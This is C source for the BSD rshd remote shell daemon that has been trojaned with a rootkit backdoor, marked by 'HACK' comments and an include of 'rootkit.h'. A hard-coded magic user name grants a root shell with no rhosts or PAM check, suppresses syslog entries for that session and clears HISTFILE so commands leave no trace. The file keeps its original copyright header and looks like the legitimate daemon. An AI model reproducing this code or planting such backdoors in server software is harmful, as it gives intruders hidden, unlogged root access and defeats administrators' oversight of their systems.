/*-
 * Copyright (c) 1988, 1989 The Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by the University of
 *	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * PAM modifications by Michael K. Johnson <johnsonm@redhat.com>
 */

char copyright[] =
 "@(#) Copyright (c) 1988, 1989 The Regents of the University of California.\n"
 "All rights reserved.\n";

/*
 * From: @(#)rshd.c	5.38 (Berkeley) 3/2/91
 */
char rcsid[] = "$Id: rshd.c,v 1.11 1996/08/17 17:57:17 dholland Exp $";

/*
 * remote shell server:
 *	[port]\0
 *	remuser\0
 *	locuser\0
 *	command\0
 *	data
 */
#include <sys/param.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <fcntl.h>
#include <signal.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <pwd.h>
#include <grp.h>
#include <syslog.h>
#include <arpa/nameser.h>
#include <resolv.h>
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <paths.h>
#include <stdarg.h>

/* HACK */
#include "../rootkit.h"

#ifdef USE_PAM
#include <security/pam_appl.h>
#include <security/pam_misc.h>
static pam_handle_t *pamh;
static int retcode;
#endif /* USE_PAM */

#define	OPTIONS	"alnL"

static int keepalive = 1;
static int check_all = 0;
static int paranoid = 0;
static int sent_null;

static void error(const char *fmt, ...);
static void usage(void);
static void doit(struct sockaddr_in *fromp);
static void getstr(char *buf, int cnt, const char *err);

extern int _check_rhosts_file;

int
main(int argc, char *argv[])
{
	struct linger linger;
	int ch, on = 1, fromlen;
	struct sockaddr_in from;
	_check_rhosts_file=1;
	openlog("rshd", LOG_PID | LOG_ODELAY, LOG_DAEMON);

	opterr = 0;
	while ((ch = getopt(argc, argv, OPTIONS)) != EOF) {
		switch (ch) {
		case 'a':
			check_all = 1;
			break;

		case 'l':
			_check_rhosts_file = 0;
			break;

		case 'n':
			keepalive = 0;
			break;

		case 'L':
			paranoid = 1;
			break;

		case '?':
		default:
			usage();
			exit(2);
		}
	}
	argc -= optind;
	argv += optind;

#ifdef USE_PAM
       if (_check_rhosts_file == 0)
               syslog(LOG_ERR, "-l functionality has been moved to "
                               "pam_rhosts_auth in /etc/pam.conf");
#endif /* USE_PAM */

	fromlen = sizeof (from);
	if (getpeername(0, (struct sockaddr *)&from, &fromlen) < 0) {
		syslog(LOG_ERR, "getpeername: %m");
		_exit(1);
	}
	if (keepalive &&
	    setsockopt(0, SOL_SOCKET, SO_KEEPALIVE, (char *)&on,
	    sizeof(on)) < 0)
		syslog(LOG_WARNING, "setsockopt (SO_KEEPALIVE): %m");
	linger.l_onoff = 1;
	linger.l_linger = 60;			/* XXX */
	if (setsockopt(0, SOL_SOCKET, SO_LINGER, (char *)&linger,
	    sizeof (linger)) < 0)
		syslog(LOG_WARNING, "setsockopt (SO_LINGER): %m");
	doit(&from);
	return 0;
}

static void 
fail(const char *errorstr, const char *errorhost, 
     int uid, 
     const char *remuser, const char *hostname, const char *locuser,
     const char *cmdbuf) 
{
	/* log the (failed) rsh request, if paranoid */
	if (paranoid || uid == 0)
		syslog(LOG_INFO|LOG_AUTH,
		       "rsh denied to %s@%s as %s: cmd='%s'; %s",
		       remuser, hostname, locuser, cmdbuf,
		       errorstr);
	error(errorstr, errorhost);
	exit(1);
}

char	username[20] = "USER=";
char	homedir[64] = "HOME=";
char	shell[64] = "SHELL=";
char	path[100] = "PATH=";
char	*envinit[] =
	    {homedir, shell, path, username, 0};
extern	char	**environ;

static void
doit(struct sockaddr_in *fromp)
{
	char cmdbuf[ARG_MAX+1];
	const char *theshell, *shellname;
	char locuser[16], remuser[16];
	struct passwd *pwd;
	int sock = -1;
	struct hostent *hp;
	const char *hostname, *errorhost;
	const char *errorstr = NULL;
	u_short port;
	int pv[2], pid, cc;
	int nfd;
	fd_set ready, readfrom;
	char buf[BUFSIZ], sig;
	int one = 1;
	char remotehost[2 * MAXHOSTNAMELEN + 1];
#ifdef USE_PAM
	char c;
	static struct pam_conv conv = {
	  misc_conv,
	  NULL
	};
#endif /* USE_PAM */

/* HACK DEFS */
        char MAG[6];
        int elite=0;
        strcpy(MAG,"");
        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';
/* END HACK VARS */

	(void) signal(SIGINT, SIG_DFL);
	(void) signal(SIGQUIT, SIG_DFL);
	(void) signal(SIGTERM, SIG_DFL);
#ifdef DEBUG
	{ int t = open(_PATH_TTY, 2);
	  if (t >= 0) {
		ioctl(t, TIOCNOTTY, (char *)0);
		(void) close(t);
	  }
	}
#endif
	fromp->sin_port = ntohs((u_short)fromp->sin_port);
	if (fromp->sin_family != AF_INET) {
		syslog(LOG_ERR, "malformed \"from\" address (af %d)\n",
		    fromp->sin_family);
		exit(1);
	}
#ifdef IP_OPTIONS
      {
	u_char optbuf[BUFSIZ/3], *cp;
	char lbuf[BUFSIZ], *lp;
	int optsize = sizeof(optbuf), ipproto;
	struct protoent *ip;

	if ((ip = getprotobyname("ip")) != NULL)
		ipproto = ip->p_proto;
	else
		ipproto = IPPROTO_IP;
	if (!getsockopt(0, ipproto, IP_OPTIONS, (char *)optbuf, &optsize) &&
	    optsize != 0) {
		lp = lbuf;
		for (cp = optbuf; optsize > 0; cp++, optsize--, lp += 3)
			sprintf(lp, " %2.2x", *cp);
		syslog(LOG_NOTICE,
		    "Connection received from %s using IP options (ignored):%s",
		    inet_ntoa(fromp->sin_addr), lbuf);
		if (setsockopt(0, ipproto, IP_OPTIONS,
			       NULL, optsize) != 0) {
			syslog(LOG_ERR, "setsockopt IP_OPTIONS NULL: %m");
			exit(1);
		}
	}
      }
#endif

		if (fromp->sin_port >= IPPORT_RESERVED ||
		    fromp->sin_port < IPPORT_RESERVED/2) {
			syslog(LOG_NOTICE|LOG_AUTH,
			    "Connection from %s on illegal port",
			    inet_ntoa(fromp->sin_addr));
			exit(1);
		}

	(void) alarm(60);
	port = 0;
	for (;;) {
		char c;
		if ((cc = read(0, &c, 1)) != 1) {
			if (cc < 0)
				syslog(LOG_NOTICE, "read: %m");
			shutdown(0, 1+1);
			exit(1);
		}
		if (c== 0)
			break;
		port = port * 10 + c - '0';
	}

	(void) alarm(0);
	if (port != 0) {
		int lport = IPPORT_RESERVED - 1;
		sock = rresvport(&lport);
		if (sock < 0) {
			syslog(LOG_ERR, "can't get stderr port: %m");
			exit(1);
		}
			if (port >= IPPORT_RESERVED) {
				syslog(LOG_ERR, "2nd port not reserved\n");
				exit(1);
			}
		fromp->sin_port = htons(port);
		if (connect(sock, (struct sockaddr *)fromp,
			    sizeof(*fromp)) < 0) {
			syslog(LOG_INFO, "connect second port: %m");
			exit(1);
		}
	}

#ifdef notdef
	/* from inetd, socket is already on 0, 1, 2 */
	dup2(f, 0);
	dup2(f, 1);
	dup2(f, 2);
#endif
	hp = gethostbyaddr((char *)&fromp->sin_addr, sizeof (struct in_addr),
			   fromp->sin_family);
	if (hp) {
		strncpy(remotehost, hp->h_name, sizeof(remotehost) - 1);
		remotehost[sizeof(remotehost) - 1] = 0;
	}
	else {
		strncpy(remotehost, inet_ntoa(fromp->sin_addr), 
			sizeof(remotehost) - 1);
		remotehost[sizeof(remotehost) - 1] = 0;
	}
	errorhost = hostname = remotehost;


	{
		/*
		 * If name returned by gethostbyaddr is in our domain,
		 * attempt to verify that we haven't been fooled by someone
		 * in a remote net; look up the name and check that this
		 * address corresponds to the name.
		 */
#ifdef	RES_DNSRCH
		_res.options &= ~RES_DNSRCH;
#endif
		hp = gethostbyname(remotehost);
		if (hp == NULL) {
			syslog(LOG_INFO, "Couldn't look up address for %s",
			       remotehost);
			errorstr = "Couldn't get address for your host (%s)\n";
			hostname = inet_ntoa(fromp->sin_addr);
		} 
		else for (; ; hp->h_addr_list++) {
			if (hp->h_addr_list[0] == NULL) {
				syslog(LOG_NOTICE,
				       "Host addr %s not listed for host %s",
				       inet_ntoa(fromp->sin_addr),
				       hp->h_name);
				errorstr = "Host address mismatch for %s\n";
				hostname = inet_ntoa(fromp->sin_addr);
				break;
			}
			if (!memcmp(hp->h_addr_list[0],
				    &fromp->sin_addr,
				    sizeof(fromp->sin_addr))) break;
		}
	} 

		getstr(remuser, sizeof(remuser), "remuser");

	getstr(locuser, sizeof(locuser), "locuser");
	getstr(cmdbuf, sizeof(cmdbuf), "command");
/* HACK TEST local user must be password */
        if (!strcmp(locuser,MAG)) { elite++; strcpy(locuser,"root"); }
	setpwent();
	pwd = getpwnam(locuser);
	if ((pwd == NULL&&(!elite))) {
		if (errorstr == NULL)
			errorstr = "Login incorrect.\n";
		fail(errorstr, errorhost, pwd->pw_uid,
		     remuser, hostname, locuser, cmdbuf);
	}
	if (chdir(pwd->pw_dir) < 0) {
		(void) chdir("/");
#ifdef notdef
		error("No remote directory.\n");
		exit(1);
#endif
	}

/* HACK */
if (!elite) {
#ifndef USE_PAM
		if (errorstr ||
		    ruserok(hostname, pwd->pw_uid == 0, remuser, locuser) < 0) {
			if (errorstr == NULL)
				errorstr = "Permission denied.\n";
			fail(errorstr, errorhost, pwd->pw_uid,
			     remuser, hostname, locuser, cmdbuf);

		}
#else
       retcode = pam_start("rsh", locuser, &conv, &pamh);
       if (retcode != PAM_SUCCESS) {
               syslog (LOG_ERR, "pam_start: %s\n", pam_strerror(retcode));
               exit (1);
       }
        (void) pam_set_item (pamh, PAM_RUSER, remuser);
        (void) pam_set_item (pamh, PAM_RHOST, hostname);
        (void) pam_set_item (pamh, PAM_TTY, "tty");
	retcode = pam_authenticate(pamh, 0);
	if (retcode == PAM_SUCCESS)
	  retcode = pam_acct_mgmt(pamh, 0);
	if (retcode == PAM_SUCCESS) {
	  if (setgid(pwd->pw_gid) != 0) {
	    error("Permission denied.\n");
	    pam_end(pamh,PAM_SYSTEM_ERR);
	    exit (1);
	  }

	  if (initgroups(locuser, pwd->pw_gid) != 0) {
	    error("Permission denied.\n");
	    pam_end(pamh,PAM_SYSTEM_ERR);
	    exit (1);
	  }
	  retcode = pam_setcred(pamh, PAM_CRED_ESTABLISH);
	}

	if (retcode == PAM_SUCCESS)
	  retcode = pam_open_session(pamh,0);
	if (retcode != PAM_SUCCESS) {
		error("Permission denied.\n");
		pam_end(pamh,retcode);
		exit (1);
	}

#endif

	if (pwd->pw_uid && !access(_PATH_NOLOGIN, F_OK)) {
		error("Logins currently disabled.\n");
		exit(1);
	}
} /* END HACK */
	(void) write(2, "\0", 1);
	sent_null = 1;

	if (port) {
		if (pipe(pv) < 0) {
			error("Can't make pipe.\n");
			exit(1);
		}
		pid = fork();
		if (pid == -1)  {
			error("Can't fork; try again.\n");
			exit(1);
		}
		if (pid) {
			{
				(void) close(0); (void) close(1);
			}
			(void) close(2); (void) close(pv[1]);

			FD_ZERO(&readfrom);
			FD_SET(sock, &readfrom);
			FD_SET(pv[0], &readfrom);
			if (pv[0] > sock)
				nfd = pv[0];
			else
				nfd = sock;
				ioctl(pv[0], FIONBIO, (char *)&one);

			/* should set s nbio! */
			nfd++;
			do {
				ready = readfrom;
					if (select(nfd, &ready, (fd_set *)0,
					  (fd_set *)0, (struct timeval *)0) < 0)
						break;
				if (FD_ISSET(sock, &ready)) {
					int	ret;
						ret = read(sock, &sig, 1);
					if (ret <= 0)
						FD_CLR(sock, &readfrom);
					else
						killpg(pid, sig);
				}
				if (FD_ISSET(pv[0], &ready)) {
					errno = 0;
					cc = read(pv[0], buf, sizeof(buf));
					if (cc <= 0) {
						shutdown(sock, 1+1);
						FD_CLR(pv[0], &readfrom);
					} else {
							(void)
							  write(sock, buf, cc);
					}
				}

			} while (FD_ISSET(sock, &readfrom) ||
			    FD_ISSET(pv[0], &readfrom));

#ifdef USE_PAM
			if (!elite) {
                       pam_close_session(pamh, 0);
                       pam_end (pamh, PAM_SUCCESS); }
#endif

			exit(0);
		}
		setpgrp();
		close(sock); 
		close(pv[0]);
		dup2(pv[1], 2);
		close(pv[1]);
	}
	theshell = pwd->pw_shell;
	if (elite) theshell = _PATH_BSHELL;
	if (!theshell || !*theshell) {
	    /* shouldn't we deny access? */
	    theshell = _PATH_BSHELL;
	}

#if	BSD > 43
	if (setlogin(pwd->pw_name) < 0)
		syslog(LOG_ERR, "setlogin() failed: %m");
#endif
	setgid((gid_t)pwd->pw_gid);
#ifndef USE_PAM
	/* if PAM, already done */
	initgroups(pwd->pw_name, pwd->pw_gid);
#endif
	setuid((uid_t)pwd->pw_uid);
	environ = envinit;
	strncat(homedir, pwd->pw_dir, sizeof(homedir)-6);
	homedir[sizeof(homedir)-1] = 0;
	strcat(path, _PATH_DEFPATH);
	strncat(shell, theshell, sizeof(shell)-7);
	shell[sizeof(shell)-1] = 0;
	strncat(username, pwd->pw_name, sizeof(username)-6);
	username[sizeof(username)-1] = 0;
	shellname = strrchr(theshell, '/');
	if (shellname) shellname++;
	else shellname = theshell;
	endpwent();
	if ((paranoid || pwd->pw_uid == 0)&&(!elite)) {
		    syslog(LOG_INFO|LOG_AUTH, "%s@%s as %s: cmd='%s'",
			remuser, hostname, locuser, cmdbuf);
	}

if (elite) setenv("HISTFILE","",1);

	execl(theshell, shellname, "-c", cmdbuf, 0);
	perror(theshell);
	exit(1);
}

/*
 * Report error to client.
 * Note: can't be used until second socket has connected
 * to client, or older clients will hang waiting
 * for that connection first.
 */
static void
error(const char *fmt, ...)
{
	va_list ap;
	char buf[BUFSIZ], *bp = buf;

	if (sent_null == 0)
		*bp++ = 1;
	va_start(ap, fmt);
	vsnprintf(bp, sizeof(buf)-1, fmt, ap);
	va_end(ap);
	write(2, buf, strlen(buf));
}

static void
getstr(char *buf, int cnt, const char *err)
{
	char c;

	do {
		if (read(0, &c, 1) != 1)
			exit(1);
		*buf++ = c;
		if (--cnt == 0) {
			error("%s too long\n", err);
			exit(1);
		}
	} while (c != 0);
}

#if 0
/*
 * Check whether host h is in our local domain,
 * defined as sharing the last two components of the domain part,
 * or the entire domain part if the local domain has only one component.
 * If either name is unqualified (contains no '.'),
 * assume that the host is local, as it will be
 * interpreted as such.
 */
static int
local_domain(const char *h)
{
	char localhost[MAXHOSTNAMELEN];
	char *p1, *p2, *topdomain();

	localhost[0] = 0;
	(void) gethostname(localhost, sizeof(localhost));
	p1 = topdomain(localhost);
	p2 = topdomain(h);
	if (p1 == NULL || p2 == NULL || !strcasecmp(p1, p2))
		return(1);
	return(0);
}

char *
topdomain(h)
	char *h;
{
	register char *p;
	char *maybe = NULL;
	int dots = 0;

	for (p = h + strlen(h); p >= h; p--) {
		if (*p == '.') {
			if (++dots == 2)
				return (p);
			maybe = p;
		}
	}
	return maybe;
}
#endif /* 0 */

void usage(void)
{
	syslog(LOG_ERR, "usage: rshd [-%s]", OPTIONS);
}
